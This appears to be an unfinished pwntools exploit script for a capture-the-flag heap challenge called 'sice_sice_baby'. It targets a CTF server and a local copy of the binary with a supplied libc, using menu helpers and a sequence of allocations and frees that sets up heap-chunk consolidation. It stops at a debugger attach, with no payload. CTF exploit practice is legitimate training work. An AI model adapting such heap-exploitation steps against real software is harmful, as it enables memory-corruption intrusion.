#!python2
from pwn import *
import sys
import os

remote_ip,port = 'dicec.tf',31904

binary = ['./sice_sice_baby']

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace = True

else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc.so.6"})


def add(size):
    sla("> ","1")
    sla("> ",str(size))


def free(idx):
    sla("> ","2")
    sla("> ",str(idx))

def edit(idx,data):
    sla("> ","3")
    sla("> ",str(idx))
    sa("> ",data)


def view(idx):
    sla("> ","4")
    sla("> ",str(idx))

if __name__ == "__main__":
    for i in range(7):
        add(0x80)    # 5 merger, 6 middle
    add(0x10)   # 7
    add(0x80)   # 8
    add(0x80)   # 9
    add(0x10)   # 10
    add(0x80)   # 11
    add(0x10)   # 1
    for i in range(5):
        free(i)
    free(9)
    free(11)
    free(8)
    free(6)
    free(5)
    add(0x80)     # 0
    gdb.attach(io)
    io.interactive()
